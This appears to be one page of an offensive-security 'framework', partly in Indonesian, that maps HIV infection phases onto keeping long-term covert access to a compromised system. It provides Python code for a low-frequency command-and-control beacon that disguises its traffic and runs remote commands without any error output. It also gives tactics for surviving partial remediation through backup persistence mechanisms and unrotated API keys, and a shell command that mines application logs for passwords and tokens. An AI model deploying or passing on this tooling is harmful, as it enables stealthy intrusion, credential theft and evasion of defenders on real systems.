# Phase 2: Chronic Persistence

> Virus hadir tapi diam. Sistem imun melawan sebagian berhasil, tapi tidak bisa eliminasi total.

## Karakteristik

| Metric | Value |
|---|---|
| Viral load | RENDAH |
| Persistence | MAINTAINED |
| Detection risk | MINIMAL |
| Duration | Minggu–bulan |

## Minimal-Footprint Beacon

```python
import time, random, requests

def chronic_beacon(c2: str):
    while True:
        time.sleep(random.uniform(14400, 28800))  # 4-8 jam
        try:
            r = requests.get(c2 + "/update",
                headers={"User-Agent": "Mozilla/5.0 (compatible; app-updater/1.0)"},
                timeout=10)
            if r.status_code == 200 and r.text != "NO_OP":
                execute_command(r.text)
        except:
            pass  # Fail silently always
```

## Surviving Partial Remediation

```
Defender patches vuln      → attacker UNAFFECTED (persistence intact)
Defender finds 1 mechanism → use backup, defender declares victory
Defender rotates passwords  → use OAuth/API key that wasn't rotated
```

HIV lesson: multiple reservoirs. Lose one gracefully — others survive.

## Chronic Phase Intel (Zero Active Footprint)

```bash
tail -f /var/log/app/debug.log | grep -iE "password|token|key"
ls -lt /var/www/html/ | head -20
```

## Cycle

```
[CHRONIC: low activity]
    ↓ threat response detected
[LATENT: zero activity]
    ↓ stand-down / timeout
[REACTIVATION: targeted run]
    ↓ objective done
[BACK TO CHRONIC/LATENT]
```

*Part of HIV Framework | Security--Skill by wahyunuriman999*
